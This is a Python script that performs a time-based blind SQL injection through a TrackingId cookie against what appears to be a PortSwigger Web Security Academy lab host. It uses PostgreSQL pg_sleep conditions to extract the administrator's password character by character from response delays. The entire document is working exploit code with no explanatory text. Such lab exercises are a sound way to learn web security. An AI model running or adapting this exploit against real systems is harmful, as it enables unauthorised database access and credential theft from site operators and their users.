import requests

url = "https://0ada00f5040a50a88045c60c007c0012.web-security-academy.net"
session = "VqcdG3nKZ1grHtkeI2dzFFTq0IBUb2lP"
password = ""

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for position in range(1, 21):
    found = False
    for char in chars:
        cookie = (
            f"TrackingId=BdN2AdNjUXKeQnem'||(SELECT CASE WHEN "
            f"(substr((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}') "
            f"THEN pg_sleep(8) ELSE pg_sleep(0) END)||'--; session={session}"
        )
        headers = {"Cookie": cookie}
        try:
            r = requests.get(url, headers=headers, timeout=15)
        except requests.exceptions.Timeout:
            password += char
            print(f"Position {position}: {char} (timeout) → password so far: {password}")
            found = True
            break

        if r.elapsed.total_seconds() >= 7:
            password += char
            print(f"Position {position}: {char}  →  password so far: {password}")
            found = True
            break
    if not found:
        print(f"No match found at position {position}, stopping.")
        break

print(f"\nFull password: {password}")
